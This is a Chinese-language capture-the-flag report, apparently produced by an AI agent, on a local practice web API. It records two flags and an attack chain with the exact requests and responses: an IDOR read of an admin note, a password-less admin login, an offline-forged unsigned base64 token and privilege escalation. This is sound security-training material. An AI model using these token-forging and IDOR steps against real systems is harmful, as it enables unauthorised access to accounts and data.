@@ -1,0 +1,23 @@
+授权范围已确认（`exact:http://127.0.0.1:18081`），全程只访问该地址（靶场源码为本地文件读取，无网络外联）。
+
+## FLAG 原文
+
+1. **`FLAG{api_chain_ok}`** — admin token 链主 FLAG
+   来自 `GET /admin/config`（伪造/弱登录得到 uid=2 token 后）
+2. **`FLAG{idor_user2}`** — IDOR 泄露的 admin note FLAG
+   来自 `GET /notes?id=2` → `admin-secret-FLAG{idor_user2}`
+
+## 攻击链
+
+1. **侦察**：`GET /` 返回端点列表 + 提示 `token=base64({json uid})` → **E-002**
+2. **IDOR**：无任何凭据 `GET /notes?id=2` → 200，直接返回 admin 笔记 → **E-003**
+3. **弱登录**：`POST /login` body `{"user":"admin"}`（无密码校验）→ `{"token":"eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=","uid":"2"}` → **E-004**
+4. **离线伪造 token**：`base64('{"uid":"2"}')` = `eyJ1aWQiOiIyIn0=`（token 无签名/无密钥）
+5. **提权**：`GET /admin/config?token=eyJ1aWQiOiIyIn0=` → `{"flag":"FLAG{api_chain_ok}","debug":true}`；无 token 基线为 403 `{"error":"admin only"}` → **E-005**
+6. **源码交叉验证**（本地文件）：`_auth_user()` 仅 base64 解码取 `uid`、比较 `uid != "2"`；`/notes` 不比对 owner；`uid = "2" if user=="admin"` → **E-006**
+
+## 引用 E-id 列表
+
+`E-002`（端点/提示侦察）、`E-003`（IDOR → FLAG{idor_user2}）、`E-004`（弱登录出 uid=2 token）、`E-005`（伪造 token → FLAG{api_chain_ok} + 403 基线）、`E-006`（server.py 源码确证）
+
+findings 已记录 2 条，evidence 落盘于 `evidence/`。
